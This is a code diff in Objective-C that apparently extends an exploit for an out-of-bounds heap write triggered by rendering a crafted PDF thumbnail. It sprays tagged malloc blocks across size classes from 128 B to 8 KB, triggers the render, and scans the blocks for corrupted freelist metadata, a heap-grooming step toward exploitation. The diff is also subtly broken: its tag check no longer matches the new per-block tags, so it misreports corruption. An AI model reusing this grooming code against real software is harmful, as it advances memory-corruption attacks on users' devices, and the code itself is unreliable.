@@ -62,21 +62,32 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
 // regions with a marker, trigger, then scan for CHANGED words.  If the OOB write
 // lands inside one of our regions, the marker changes — that is a proof of
 // attacker-controlled corruption, usable even when the process survives.
+// Spray a RANGE of size classes with a recognisable tag.  The crash reports
+// show the OOB write landing in malloc freelist metadata for allocations of
+// ~1.8 KB and ~3.7 KB, so the earlier single-size 8 MB groom could never be
+// hit: those blocks live in a different size class entirely.
 static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
     const uint64_t MARK = 0xA5A5A5A5A5A5A5A5ULL;
     NSMutableArray *ptrs = [NSMutableArray array];
-    for (int i = 0; i < regions; i++) {
-        void *p = malloc(each);
-        if (!p) break;
-        memset(p, 0xA5, each);
-        // a recognisable per-region tag in the first slots
-        ((uint64_t *)p)[0] = MARK ^ (uint64_t)i;
-        ((uint64_t *)p)[1] = MARK;
-        [ptrs addObject:[NSValue valueWithPointer:p]];
+    NSMutableArray *sizes = [NSMutableArray array];
+    // spray a ladder of size classes: the freelist corruption was observed for
+    // ~1.8 KB and ~3.7 KB allocations, so cover 128 B .. 8 KB in doubling steps
+    // and put `regions` blocks in each class.
+    size_t szs[] = { 128, 256, 512, 1024, 2048, 3744, 4096, 8192 };
+    for (size_t si = 0; si < sizeof(szs) / sizeof(szs[0]); si++) {
+        for (int i = 0; i < regions; i++) {
+            void *p = malloc(szs[si]);
+            if (!p) break;
+            memset(p, 0xA5, szs[si]);
+            ((uint64_t *)p)[0] = MARK ^ (uint64_t)(si * 1000003 + i);
+            ((uint64_t *)p)[1] = MARK;
+            [ptrs addObject:[NSValue valueWithPointer:p]];
+            [sizes addObject:[NSValue valueWithSize:szs[si]]];
+        }
     }
     int n = (int)ptrs.count;
-    AvePost([NSString stringWithFormat:@"86950 groom: %d regions x %zu KB (~%zu MB) tagged",
-             n, each / 1024, (n * each) >> 20]);
+    AvePost([NSString stringWithFormat:@"86950 groom: %d blocks tagged across %d size "
+             @"classes (128 B .. 8 KB)", n, (int)(sizeof(szs) / sizeof(szs[0]))]);
 
     NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-G%d", n], maxPx);
     AvePost([NSString stringWithFormat:@"86950 groom-render: %@", r]);
@@ -84,18 +95,19 @@ static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) 
     int corrupt = 0;
     for (int i = 0; i < n; i++) {
         void *p = [ptrs[i] pointerValue];
+        size_t sz = [sizes[i] sizeValue];
         uint64_t *q = (uint64_t *)p;
-        for (size_t off = 0; off + 8 <= each; off += 8) {
+        for (size_t off = 0; off + 8 <= sz; off += 8) {
             if (q[0] == (MARK ^ (uint64_t)i) && off == 0) continue;   // our own tag
             if (q[off / 8] != 0xA5A5A5A5A5A5A5A5ULL) {
-                AvePost([NSString stringWithFormat:@"86950 CORRUPTION region %d @+%#zx "
-                         @"= %#llx (no crash)", i, off, q[off / 8]]);
+                AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d (+%zu) "
+                         @"@+%#zx = %#llx", i, sz, off, q[off / 8]]);
                 corrupt++;
-                if (corrupt > 8) break;
+                if (corrupt > 12) break;
             }
         }
         free(p);
-        if (corrupt > 8) break;
+        if (corrupt > 12) break;
     }
     AvePost([NSString stringWithFormat:@"86950 groom scan: %d corrupted words", corrupt]);
     return corrupt;
